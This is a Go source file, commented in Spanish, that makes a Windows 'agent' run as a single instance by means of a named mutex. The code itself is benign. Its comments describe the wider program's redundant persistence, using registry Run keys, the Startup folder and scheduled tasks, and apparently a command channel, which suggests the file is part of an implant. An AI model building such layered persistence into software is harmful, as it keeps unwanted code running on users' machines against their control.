//go:build windows

package win32

import (
	"errors"
	"fmt"
	"time"

	"golang.org/x/sys/windows"
)

// instanceMutex guarda el handle del mutex de instancia única. Vive durante
// toda la vida del proceso: Windows lo libera solo al terminar.
var instanceMutex windows.Handle

// ErrAlreadyRunning indica que otra copia del agente ya tiene el mutex.
var ErrAlreadyRunning = errors.New("win32: ya hay una instancia del agente corriendo")

// AcquireSingleInstance crea un mutex con nombre. Si ya existe, otra copia del
// agente está viva y esta debe salir sin tocar nada.
//
// Las cuatro capas de persistencia (HKCU Run, HKLM Run, carpeta Startup y las
// dos tareas programadas) disparan a la vez en el logon. Sin este mutex la
// máquina arranca cinco copias del agente y cada una crea su propio canal.
//
// Reintenta durante `wait` porque el proceso padre que relanza la copia
// instalada sigue con el mutex tomado unos milisegundos: el hijo espera a que
// lo suelte en vez de rendirse y desaparecer.
func AcquireSingleInstance(name string, wait time.Duration) error {
	namePtr, err := windows.UTF16PtrFromString(name)
	if err != nil {
		return fmt.Errorf("win32: nombre de mutex inválido: %w", err)
	}

	deadline := time.Now().Add(wait)
	for {
		handle, err := windows.CreateMutex(nil, false, namePtr)
		if errors.Is(err, windows.ERROR_ALREADY_EXISTS) {
			if handle != 0 {
				if cerr := windows.CloseHandle(handle); cerr != nil {
					_ = cerr
				}
			}
			if time.Now().After(deadline) {
				return ErrAlreadyRunning
			}
			time.Sleep(250 * time.Millisecond)
			continue
		}
		if err != nil {
			return fmt.Errorf("win32: CreateMutex: %w", err)
		}
		if handle == 0 {
			return errors.New("win32: CreateMutex devolvió handle nulo")
		}

		instanceMutex = handle
		return nil
	}
}

// ReleaseSingleInstance suelta el mutex para que el hijo relanzado pueda
// tomarlo. Se llama justo antes de lanzar la copia instalada.
func ReleaseSingleInstance() {
	if instanceMutex == 0 {
		return
	}
	if err := windows.CloseHandle(instanceMutex); err != nil {
		_ = err
	}
	instanceMutex = 0
}
